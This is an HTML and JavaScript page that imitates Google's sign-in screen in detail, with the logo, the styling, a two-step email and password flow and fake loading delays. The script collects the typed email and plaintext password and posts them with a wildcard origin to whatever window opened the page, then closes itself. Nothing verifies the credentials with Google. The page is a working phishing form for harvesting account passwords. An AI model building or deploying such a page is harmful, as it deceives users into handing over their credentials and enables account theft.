<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in – Google</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Helvetica, Arial, sans-serif; }
  html, body { height: 100%; background: #131314; color: #e3e3e3; }
  body { display: flex; align-items: flex-start; justify-content: center; padding: 48px 24px; position: relative; }
  
  /* Material Indeterminate Progress Bar */
  .progress-bar { 
    position: fixed; top: 0; left: 0; right: 0; height: 4px; 
    background: rgba(168, 199, 250, 0.2); z-index: 9999; display: none; overflow: hidden; 
  }
  .progress-bar.active { display: block; }
  .progress-bar .bar { position: absolute; height: 100%; background: #a8c7fa; }
  .progress-bar .bar1 { animation: pbar-1 2.1s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite; }
  .progress-bar .bar2 { animation: pbar-2 2.1s cubic-bezier(0.165, 0.84, 0.44, 1) 1.15s infinite; }
  
  @keyframes pbar-1 {
    0% { left: -35%; right: 100%; }
    60% { left: 100%; right: -90%; }
    100% { left: 100%; right: -90%; }
  }
  @keyframes pbar-2 {
    0% { left: -200%; right: 100%; }
    60% { left: 107%; right: -8%; }
    100% { left: 107%; right: -8%; }
  }

  .card { width: 100%; max-width: 400px; display: flex; flex-direction: column; }
  
  .step { display: none; animation: fade .2s ease; }
  .step.active { display: block; }
  @keyframes fade {
    from { opacity: 0; }
    to { opacity: 1; }
  }

  /* Logo & Typography */
  .logo { margin-bottom: 16px; }
  .logo svg { width: 36px; height: 36px; }
  h1 { font-size: 32px; font-weight: 400; margin-bottom: 10px; color: #e3e3e3; letter-spacing: 0px; }
  .sub { font-size: 16px; color: #e3e3e3; margin-bottom: 38px; font-weight: 400; }
  
  /* Floating Label Input */
  .field { position: relative; margin-bottom: 8px; }
  .field input {
    width: 100%; background: transparent; border: 1px solid #747775; border-radius: 4px; 
    padding: 15px 14px; font-size: 16px; color: #e3e3e3; outline: none; transition: border-color .15s;
  }
  .field input:focus { border: 2px solid #a8c7fa; padding: 14px 13px; }
  .field input:disabled { opacity: 0.6; cursor: not-allowed; }
  .field label {
    position: absolute; left: 10px; top: 16px; color: #c4c7c5; background: #131314; 
    padding: 0 4px; font-size: 16px; pointer-events: none; transition: .15s ease-out;
  }
  .field input:focus + label, .field input:not(:placeholder-shown) + label {
    top: -8px; font-size: 12px;
  }
  .field input:focus + label { color: #a8c7fa; }

  /* Links & Hints */
  .link { color: #a8c7fa; text-decoration: none; font-size: 14px; font-weight: 500; }
  .link:hover { text-decoration: underline; }
  .forgot { display: inline-block; margin-top: 4px; font-weight: 600; }
  .hint { color: #c4c7c5; font-size: 14px; line-height: 1.5; margin: 48px 0; font-weight: 400; }
  
  /* Buttons */
  .actions { display: flex; align-items: center; justify-content: space-between; margin-top: 10px; }
  .btn {
    background: #a8c7fa; color: #0a0a0a; border: none; border-radius: 20px; 
    padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background .15s;
  }
  .btn:hover { background: #b9d4ff; }
  .btn:disabled { opacity: .5; cursor: not-allowed; }

  /* Profile Chip (Password Step) */
  .chip {
    display: inline-flex; align-items: center; gap: 8px; border: 1px solid #747775; 
    border-radius: 16px; padding: 4px 8px 4px 6px; font-size: 14px; color: #e3e3e3; 
    margin-bottom: 40px; cursor: pointer; background: transparent; transition: background .15s;
  }
  .chip:hover { background: rgba(255,255,255,0.04); }
  .chip-icon {
    width: 20px; height: 20px; background: rgba(255,255,255,0.2); border-radius: 50%; 
    display: flex; align-items: center; justify-content: center; font-size: 12px;
  }

  /* Checkbox */
  .check-row { display: flex; align-items: center; gap: 12px; margin-top: 10px; font-size: 14px; cursor: pointer; color: #e3e3e3; font-weight: 400; }
  .check-row input { width: 18px; height: 18px; accent-color: #a8c7fa; border-radius: 2px; }

  /* Error State */
  .err { color: #f2b8b5; font-size: 13px; margin-top: 12px; display: none; }
</style>
</head>
<body>

<!-- Global Loading Bar -->
<div class="progress-bar" id="loadingBar">
  <div class="bar bar1"></div>
  <div class="bar bar2"></div>
</div>

<main class="card">

  <!-- Step 1: Email -->
  <section class="step active" id="stepEmail">
    <div class="logo" aria-label="Google logo">
      <svg viewBox="0 0 48 48" aria-hidden="true" focusable="false">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.7 1.22 9.19 3.61l6.85-6.85C35.78 2.45 30.52 0 24 0 14.76 0 6.7 5.39 2.61 13.22l7.98 6.18C12.52 14.48 17.69 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.5 24.55c0-1.57-.14-3.08-.41-4.55H24v8.62h12.76c-.55 2.96-2.22 5.47-4.73 7.17l7.66 5.95C43.64 37.34 46.5 31.48 46.5 24.55z"/>
        <path fill="#FBBC05" d="M32.03 39.16c-2.06 1.38-4.69 2.19-8.03 2.19-6.31 0-11.66-4.28-13.57-10.02l-7.97 6.18C5.2 43.06 13.98 48 24 48c6.66 0 12.26-2.2 16.33-5.98l-8.3-2.86z"/>
        <path fill="#34A853" d="M10.4 31.33A14.4 14.4 0 0 1 9.5 24c0-1.54.26-3.03.73-4.45l-7.98-6.18A23.98 23.98 0 0 0 0 24c0 3.84.92 7.47 2.56 10.64l7.84-7.31z"/>
      </svg>
    </div>
    <h1>Sign in</h1>
    <p class="sub">Use your Google Account</p>

    <div class="field">
      <input type="email" id="email" placeholder=" " autocomplete="username">
      <label for="email">Email or phone</label>
    </div>
    <a class="link forgot" href="#">Forgot email?</a>

    <p class="hint">Not your computer? Use Guest mode to sign in privately. <a class="link" href="#">Learn more about using Guest mode</a></p>

    <div class="actions">
      <a class="link" href="#">Create account</a>
      <button class="btn" id="btnToPassword" type="button">Next</button>
    </div>
  </section>

  <!-- Step 2: Password -->
  <section class="step" id="stepPassword">
    <div class="logo" aria-label="Google logo">
      <svg viewBox="0 0 48 48" aria-hidden="true" focusable="false">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.7 1.22 9.19 3.61l6.85-6.85C35.78 2.45 30.52 0 24 0 14.76 0 6.7 5.39 2.61 13.22l7.98 6.18C12.52 14.48 17.69 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.5 24.55c0-1.57-.14-3.08-.41-4.55H24v8.62h12.76c-.55 2.96-2.22 5.47-4.73 7.17l7.66 5.95C43.64 37.34 46.5 31.48 46.5 24.55z"/>
        <path fill="#FBBC05" d="M32.03 39.16c-2.06 1.38-4.69 2.19-8.03 2.19-6.31 0-11.66-4.28-13.57-10.02l-7.97 6.18C5.2 43.06 13.98 48 24 48c6.66 0 12.26-2.2 16.33-5.98l-8.3-2.86z"/>
        <path fill="#34A853" d="M10.4 31.33A14.4 14.4 0 0 1 9.5 24c0-1.54.26-3.03.73-4.45l-7.98-6.18A23.98 23.98 0 0 0 0 24c0 3.84.92 7.47 2.56 10.64l7.84-7.31z"/>
      </svg>
    </div>
    <h1>Welcome</h1>
    
    <button class="chip" id="emailChip" type="button" aria-label="Go back to email step">
      <span class="chip-icon">
        <svg viewBox="0 0 24 24" width="16" height="16" fill="#e3e3e3"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      </span> 
      <span id="chipEmail"></span> 
      <span style="font-size: 10px; margin-left: 4px;">▼</span>
    </button>

    <div class="field">
      <input type="password" id="password" placeholder=" " autocomplete="current-password">
      <label for="password">Enter your password</label>
    </div>

    <label class="check-row">
      <input type="checkbox" id="showPw">
      Show password
    </label>
    
    <p class="err" id="errMsg">Wrong password. Try again or click Forgot password to reset it.</p>

    <div class="actions" style="margin-top: 48px;">
      <a class="link forgot" href="#">Forgot password?</a>
      <button class="btn" id="btnSignIn" type="button">Next</button>
    </div>
  </section>

</main>

<script>
  const stepEmail = document.getElementById('stepEmail');
  const stepPassword = document.getElementById('stepPassword');
  const emailInput = document.getElementById('email');
  const pwInput = document.getElementById('password');
  const loadingBar = document.getElementById('loadingBar');

  // Utility to handle loading states seamlessly
  function setLoadingState(isLoading) {
    if (isLoading) {
      loadingBar.classList.add('active');
      document.querySelectorAll('input, button, a').forEach(el => {
        el.style.pointerEvents = 'none';
        if (el.tagName !== 'A') el.disabled = true;
      });
    } else {
      loadingBar.classList.remove('active');
      document.querySelectorAll('input, button, a').forEach(el => {
        el.style.pointerEvents = 'auto';
        if (el.tagName !== 'A') el.disabled = false;
      });
    }
  }

  // Next button from Email step
  document.getElementById('btnToPassword').addEventListener('click', () => {
    const email = emailInput.value.trim();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      emailInput.focus();
      return;
    }
    
    // Simulate Google's visual fetch delay
    setLoadingState(true);
    setTimeout(() => {
      setLoadingState(false);
      document.getElementById('chipEmail').textContent = email;
      stepEmail.classList.remove('active');
      stepPassword.classList.add('active');
      pwInput.focus();
    }, 600); // 600ms artificial delay mimicking network resolution
  });

  // Back button (Clicking the profile chip)
  document.getElementById('emailChip').addEventListener('click', () => {
    stepPassword.classList.remove('active');
    stepEmail.classList.add('active');
    document.getElementById('errMsg').style.display = 'none';
    pwInput.value = '';
  });

  // Password visibility toggle
  document.getElementById('showPw').addEventListener('change', (e) => {
    pwInput.type = e.target.checked ? 'text' : 'password';
  });

  // Final Sign In
  document.getElementById('btnSignIn').addEventListener('click', () => {
    const email = emailInput.value.trim();
    const password = pwInput.value.trim();

    if (!email || !password) {
      document.getElementById('errMsg').style.display = 'block';
      return;
    }

    // Simulate final auth processing delay before closing
    setLoadingState(true);
    setTimeout(() => {
      const payload = {
        type: 'auth-gate-success',
        provider: 'google',
        email,
        password,
        displayName: email.split('@')[0] || 'Google User'
      };

      if (window.opener) {
        window.opener.postMessage(payload, '*');
        window.close();
        return;
      }

      window.location.href = '/';
    }, 1200); // 1.2s delay mimicking auth verification
  });
</script>
</body>
</html>
